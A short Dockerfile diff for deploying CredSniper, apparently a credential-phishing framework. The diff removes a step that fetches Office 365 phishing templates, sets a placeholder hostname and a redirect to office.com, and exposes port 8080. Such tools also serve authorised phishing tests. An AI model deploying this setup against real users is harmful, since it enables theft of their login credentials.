@@ -6,7 +6,6 @@ RUN CHROMIUM_VERSION=$(chromium --version | awk '{print $2}' | cut -d'.' -f1) &&
 WORKDIR /app
 COPY CredSniper /app/CredSniper
 RUN pip install --no-cache-dir -r /app/CredSniper/requirements.txt
-RUN python /app/CredSniper/modules/office365/fetch_templates.py
 ENV HOSTNAME_ENV=example.com
 ENV FINAL_URL=https://www.office.com/?auth=2
 EXPOSE 8080
